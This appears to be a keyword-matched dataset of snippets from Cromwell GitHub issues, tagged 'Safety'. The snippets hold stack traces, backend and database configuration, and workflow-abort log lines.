SQLite](https://github.com/broadinstitute/cromwell/issues/5490) but there is NO ETA, and I don't know if I will ever get it to work. Still it is worth trying.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757:1542,timeout,timeout,1542,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757,2,['timeout'],['timeout']
Safety,add timeout to DB operations,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4739:4,timeout,timeout,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4739,1,['timeout'],['timeout']
Safety,"aft-2""; }; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; metadata {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql:<dburl>?rewriteBatchedStatements=true""; driver = ""com.mysql.cj.jdbc.Driver""; user = ""<user>""; password = ""<pass>"" ; connectionTimeout = 5000; }; }; }. call-caching; {; enabled = true; invalidate-bad-cache-result = true; }. docker {; hash-lookup {; enabled = true; }; }. backend {; default = sge; providers {. ; sge {; 	actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; #concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". submit-docker = """""" ; #location for .sif files and other apptainer tmp, plus lockfile; 	 export APPTAINER_CACHEDIR=<path>; export APPTAINER_PULLFOLDER=<path>; export APPTAINER_TMPDIR=<path>; export LOCK_FILE=""$APPTAINER_CACHEDIR/lockfile""; export IMAGE=$(echo ${docker} | tr '/:' '_').sif; if [ -z $APPTAINER_CACHEDIR ]; then; exit 1; fi; CACHE_DIR=$APPTAINER_CACHEDIR; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $CACHE_DIR; # downloads sifs only one a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:2752,timeout,timeout-seconds,2752,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,1,['timeout'],['timeout-seconds']
Safety,age.spi.v1.HttpStorageRpc.translate(HttpStorageRpc.java:227); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:308); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:213); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:210); 	at com.google.api.gax.retrying.DirectRetryingExecutor.submit(DirectRetryingExecutor.java:105); 	at com.google.cloud.RetryHelper.run(RetryHelper.java:76); 	at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:50); 	at com.google.cloud.storage.StorageImpl.internalCreate(StorageImpl.java:209); 	at com.google.cloud.storage.StorageImpl.create(StorageImpl.java:171); 	at cromwell.filesystems.gcs.GcsPath.request$1(GcsPathBuilder.scala:196); 	at cromwell.filesystems.gcs.GcsPath.$anonfun$writeContent$2(GcsPathBuilder.scala:203); 	at cromwell.filesystems.gcs.GcsPath.$anonfun$writeContent$2$adapted(GcsPathBuilder.scala:203); 	at cromwell.filesystems.gcs.GcsEnhancedRequest$.$anonfun$recoverFromProjectNotProvided$3(GcsEnhancedRequest.scala:18); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:87); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:355); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:376); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:316); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseExce,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594:2183,recover,recoverFromProjectNotProvided,2183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594,2,['recover'],['recoverFromProjectNotProvided']
Safety,"aises the following error:; ```; Starting defuse command:; /usr/local/bin/gmap -D defuse-data/gmap -d cdna -f psl #<1 > #>1; Reasons:; /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakp; oints.split.001.fa.cdna.psl missing; Failure for defuse command:; /usr/local/bin/gmap -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a; -ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa > /cromwell-executions/detectFusions/96242; 9bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa.cdna.psl.tmp; Reason:; Job command with nonzero return code; Return codes: 139; Job output:; Running on 2ecb3961d54d; Note: /usr/local/bin/gmap.avx2 does not exist. For faster speed, may want to compile package on an AVX2 machine; GMAP version 2018-07-04 called with args: /usr/local/bin/gmap.sse42 -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa; Checking compiler assumptions for SSE2: 6B8B4567 327B23C6 xor=59F066A1; Checking compiler assumptions for SSE4.1: -103 -58 max=198 => compiler zero extends; Checking compiler options for SSE4.2: 6B8B4567 __builtin_clz=1 __builtin_ctz=0 _mm_popcnt_u32=17 __builtin_popcount=17 ; Finished checking compiler assumptions; Pre-loading compressed genome (oligos)......done (78,222,840 bytes, 19098 pages, 0.00 sec); Pre-loading compressed genome (bits)......done (78,222,864 bytes, 19098 pages, 0.02 sec); Looking for index files in directory defuse-data/gmap/cdna; Pointers file is cdna.ref153offsets64meta; Offsets file is cdna.ref153offsets64strm; Positions file is cdna.ref153positions; Offsets compression type: bitpack64; Allocating memory for ref offset pointers, kmer 15, interval 3...Attached existing memory (2 attached) for defuse-data/gmap/cdna/cdna.ref153offsets64meta...done (134,217,744 bytes, 0.00 ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465:1223,detect,detectFusions,1223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465,1,['detect'],['detectFusions']
Safety,"akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.jav",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:12313,abort,abort,12313,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"akka.dispatchers.engine-dispatcher-29 INFO - WorkflowManagerActor WorkflowActor-796f3949-47e6-497e-9458-59ab53a063c6 is in a terminal state: WorkflowSucceededState; 2020-06-04 21:43:43,504 cromwell-system-akka.actor.default-dispatcher-56 ERROR - Carboniting failure: cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.. Marking as TooLargeToArchive; cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.; 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:283); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:267); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:38); 	at akka.actor.FSM.processEvent(FSM.scala:707); 	at akka.actor.FSM.processEvent$(FSM.scala:704); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.akka$actor$LoggingFSM$$super$processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.LoggingFSM.processEvent(FSM.scala:847); 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:829); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:701); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:695); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073:1086,safe,safety,1086,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073,1,['safe'],['safety']
Safety,"ala:54); 	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:239); 	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:237); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4(DBIOAction.scala:533); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4$adapted(DBIOAction.scala:533); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.run(DBIOAction.scala:533); 	at slick.dbio.SynchronousDatabaseAction$$anon$11.run(DBIOAction.scala:570); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:745); ```; The Cromwell configuration is:; ```; system {; workflow-restart = true; }; call-caching {; enabled = true; }. database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:file:/n/groups/bcbio/cwl/test_bcbio_cwl/somatic/cromwell_work/persist/metadata;shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 20000; }; }. backend {; providers {; Local {; config {; runtime-attributes = """"""; Int? cpu; Int? memory_mb; """"""; submit-docker: """". filesystems {; local {; caching {; duplication-strategy: [""soft-link""]; hashing-strategy: ""path""; }; }; }. }; }. }; }; ```; Does this provide enough information to identify what might be happening? Thanks for any thoughts or clues about avoid this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3607:6618,avoid,avoid,6618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3607,1,['avoid'],['avoid']
Safety,"allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; system {; 	job-rate-control {; 	 jobs = 100; 	 per = 1 second; 	}; input-read-limits {; lines = 128000000; bool = 7; int = 19; float = 50; string = 1280000; json = 12800000; tsv = 1280000000; map = 128000000; object = 128000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; 	graceful-server-shutdown = true; max-concurrent-workflows = 5000. io {; throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; number-of-requests = 100000; per = 100 seconds; }; }; }. akka {; # Optionally set / override any akka settings; http {; server {; # Increasing these timeouts allow rest api responses for very large jobs; # to be returned to the user. When the timeout is reached the server would respond; # `The server was not able to produce a timely response to your request.`; # https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows; request-timeout = 600s; idle-timeout = 600s; }; }; }. services {; MetadataService {; #class = ""cromwell.services.metadata.impl.MetadataServiceActor""; config {; metadata-read-row-number-safety-threshold = 2000000; # # For normal usage the default value of 200 should be fine but for larger/production environments we recommend a; # # value of at least 500. There'll be no one size fits all number here so we recommend benchmarking performance and; # # tuning the value to match your environment.; db-batch-size = 700; }; }; }. google {. application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. docker {; hash-lookup {; met",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:8537,timeout,timeouts,8537,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['timeout'],['timeouts']
Safety,"arsing workflow as WDL draft-2; 2018-06-06 16:18:47,232 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - WorkflowManagerActor Workflow 948bf608-f91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:2360,unsafe,unsafeToFuture,2360,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['unsafe'],['unsafeToFuture']
Safety,"arsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99600,unsafe,unsafeToFuture,99600,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeToFuture']
Safety,"at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.Abstra",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:12244,abort,abort,12244,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:57,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:58,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:59,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:00,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:01,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:02,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:03,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:04,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:05,57] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:19308,abort,abort,19308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive$(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:569); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:2025,recover,recoverAsync,2025,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['recover'],['recoverAsync']
Safety,"atcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: 